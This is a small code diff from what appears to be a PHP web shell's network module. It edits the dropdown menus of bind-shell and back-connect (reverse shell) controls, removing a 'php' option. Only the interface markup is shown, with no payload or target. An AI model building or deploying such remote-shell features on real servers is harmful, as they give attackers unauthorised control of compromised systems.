@@ -29,7 +29,7 @@ $GLOBALS['module']['network']['content'] = "
 	<tr>
 		<td style='width:120px;'>
 			<select id='bindLang' class='rsType'>
-				<option>php</option>".$winbinary."
+				".$winbinary."
 			</select>
 		</td>
 		<td><span class='button' onclick=\"rs_go_bind();\" style='width:120px;'>run</span></td>
@@ -50,7 +50,7 @@ $GLOBALS['module']['network']['content'] = "
 	<tr>
 		<td style='width:120px;'>
 			<select id='backLang' class='rsType'>
-				<option>php</option>".$winbinary."
+				".$winbinary."
 			</select>
 		</td>
 		<td><span class='button' onclick=\"rs_go('back');\" style='width:120px;'>run</span></td>
